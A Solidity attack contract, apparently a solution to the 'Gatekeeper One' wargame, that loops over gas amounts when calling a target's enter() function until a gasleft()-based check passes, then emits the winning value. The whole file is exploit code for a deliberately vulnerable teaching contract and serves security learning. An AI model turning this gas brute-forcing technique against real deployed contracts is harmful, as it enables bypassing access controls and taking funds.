// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GateKeeperOne.sol";

contract AttackGateOne {
    GateKeeperOne gateKeeperOne;

    event Hacked(uint256 gasBrute);

    function bruteForceInitialGasAmount(
        address _gatekeeperAddr,
        uint256 _lowerGasBrute,
        uint256 _upperGasBrute
    ) public {
        //bytes8 key = bytes8(uint64(uint160(_gatekeeperAddr)) & 0xFFFFFFFF0000FFFF);
        bool success;
        uint256 gasBrute;
        for (
            gasBrute = _lowerGasBrute;
            gasBrute <= _upperGasBrute;
            gasBrute++
        ) {
            (success, ) = _gatekeeperAddr.call{gas: gasBrute + (8191 * 3)}(
                abi.encodeWithSignature("enter()")
            );
            if (success) {
                break;
            }
        }
        require(success, "HACK FAILED");
        emit Hacked(gasBrute); // -> This is the least value of `x`.
    }
}
